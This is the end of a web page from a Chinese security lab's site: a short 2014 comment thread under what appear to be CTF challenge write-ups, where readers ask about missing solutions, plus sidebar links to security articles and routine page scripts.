<div class="clearfix re-comment">
    <div class="comment-quote">  
        <div class="comment-user">
            <a href="javascript:;" class="response" data-bind-id="0" data-target="210">Jayvic</a> <span class="comment-time">2014-12-09 11:05:50</span>            <div class="comment-action">                        <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="210">回复</a></span>&nbsp;|&nbsp;                        <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_210" data-type="comment">点赞</a></span>            </div>
            <p>之前还担心看不到PT的题解，这下全有了~(≧▽≦)/~
PS：PT真是不能言说的痛</p>
        </div>
    </div>
        </div>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/11x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="210" user-name="Jayvic" href="javascript:;">
                Jayvic            </a>
                        <span class="comment-time">2014-12-09 11:05:50</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="210">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_210" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">之前还担心看不到PT的题解，这下全有了~(≧▽≦)/~
PS：PT真是不能言说的痛</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src='http://p1.qhmsg.com/dm/48_48_100/t03ebd77aa17ce4fc5d.jpg'/>              
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="279032883" class="response" data-bind-id="279032883" data-target="207" user-name="yuan_baobao" href="javascript:;">
                yuan_baobao            </a>
                        <span class="comment-time">2014-12-09 10:49:16</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="279032883" data-target="207">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_207" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">缺RE300和RE500，没人做出来，坐等官方更新</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
<div class="clearfix re-comment">
    <div class="comment-quote">  
        <div class="comment-user">
            <a href="javascript:;" class="response" data-bind-id="0" data-target="202">Newbie</a> <span class="comment-time">2014-12-08 22:48:53</span>            <div class="comment-action">                        <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="202">回复</a></span>&nbsp;|&nbsp;                        <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_202" data-type="comment">点赞</a></span>            </div>
            <p>这真的通关了吗？我语文不好，不要骗我</p>
        </div>
    </div>
        </div>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src='http://p1.qhmsg.com/dm/48_48_100/t03ebd77aa17ce4fc5d.jpg'/>              
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="279032883" class="response" data-bind-id="279032883" data-target="206" user-name="yuan_baobao" href="javascript:;">
                yuan_baobao            </a>
                        <span class="comment-time">2014-12-09 10:47:45</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="279032883" data-target="206">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_206" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">那个在最下面</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
<div class="clearfix re-comment">
    <div class="comment-quote">  
        <div class="comment-user">
            <a href="javascript:;" class="response" data-bind-id="1337113367" data-target="203">woldywei</a> <span class="comment-time">2014-12-09 01:31:54</span>            <div class="comment-action">                        <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="1337113367" data-target="203">回复</a></span>&nbsp;|&nbsp;                        <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_203" data-type="comment">点赞</a></span>            </div>
            <p>贪吃蛇在哪里。。</p>
        </div>
    </div>
        </div>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>

        <a class="more-long comment-more" href="javascript:;" data-target="/comment/more" data-type="learning" data-source-id="129" data-page="2">查看更多</a>
            </div>
</div>
<script>
    $(function () {
        $('.anonymous-comment').click(function () {
            $(".join").hide();
            $(".reg-log textarea").first().removeAttr("disabled").show();
            $('#use_nickname').val('1');
//            $('#trigger-nickname').attr('checked', true);
            $('#trigger-nickname').trigger('click');
        });
        //为所有复选框绑定事件
//        checkbox_on_click();
        //ajax随机获取昵称
//        randnicknameajax(0);
        //ajax检测登录状态
        comment_check_login();
    });



    function input_checkbox(flag) {
        $('input:checkbox').each(function () {
            var value = flag ? 1 : 0;
            $(this).prop('checked', flag);
            $(this).val(value);
        });
    }

//ajax随机获取昵称
    function randnicknameajax(flag) {
        $.ajax({
            type: 'POST',
            url: $('#post-nickname-url-ajax').val(),
            data: {limit: 1, flag: flag},
            dataType: "json",
            success: function (data) {
                $('#nick-name').val(data.data[0]);
                _nick_name=data.data[0];
            }
        });
    }
    $();
//ajax检测登录状态
    function comment_check_login() {
        $.ajax({
            type: 'POST',
            url: $('#post-check-login-url-ajax').val(),
            data: {},
            dataType: "json",
            success: function (data) {
                if (data.success) {
                    $('.join').hide();
                    $(".reg-log textarea").first().removeAttr("disabled").show();
                    $("#span_use_nickname").show();
                    $('#use_nickname').val('0');
                    $('#use_nickname').attr('checked', false);
                }
            }
        });
    }
</script>        </div>
    </div>
    <div class="side-bar">
        <div class="mod hot-news">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
    </div>
    <ul class="links-list">
                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
                                <li><a href="/learning/detail/4424.html" alt="【知识】9月16日 - 每日安全知识热点" target="_blank">【知识】9月16日 - 每日安全知识热...</a></li>
                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
            </ul>
</div>        <!-- 友情链接 -->
        <div class="mod blog-links mobile-hide">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
        <a href="/links/index.html" class="more">更多<i></i></a>
    </div>
        <ul class="links-list">
                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
            </ul>
    </div>
        <!-- 联系我们 -->
        <div class="mod contact mobile-hide" style="text-align:center">
    <div class="head-bar clearfix">
        <h2><i></i><span>关注我们</span></h2>
    </div>
    <!-- 微信关注 -->
    <ul class="contact-way">
        <li><a>微信关注</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
    <!-- APP下载 -->
    <ul class="contact-way">
        <li><a>安全播报APP</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
</div>

    </div>
</div>

<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/common.js?v=4.5"></script>
<script>$(function() {sync_count('comment');});</script>


<!-- 语法高亮 -->
<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
    </div>

        <div class="footer">
        <div class="friend-link">
            <a href="http://www.360.cn/" target="_blank">360首页</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">关于我们</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">联系我们</a>
            <span>|</span>
            <a href="/links/index.html" target="_blank">友情链接</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">招贤纳士</a>
        </div>
        <div class="copy">
            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
        </div>
    </div>
    
</div>

<!--奇舞团统计-->

<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
<script>
    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
</script>

<div class="hide">
    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
</div>
<div class="backToTop_wrap off">
    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
</div>
<script>
    var $backToTop_wrap = $(".backToTop_wrap"),
        $backToTop_btn = $("#back_to_top");

    if ($(window).scrollTop() > 100) {
        $backToTop_wrap.removeClass("off");
    }
    else {
        $backToTop_wrap.addClass("off");
    }

    $(window).on("scroll", function () {
        if ($(this).scrollTop() > 100) {
            $backToTop_wrap.removeClass("off");
        }
        else {
            $backToTop_wrap.addClass("off");
        }
    });

    $backToTop_btn.on("click", function () {
        $("html, body").animate({scrollTop: 0}, 120);
    });

    $(function () {
        var navlist = $('.nav-list > li');

        navlist.each(function () {
            $(this).on('mouseenter', function () {
                $(this).addClass('selected');
            });

            $(this).on('mouseleave', function () {
                $(this).removeClass('selected');
            });
        });
    })
</script>



</body>
</html>
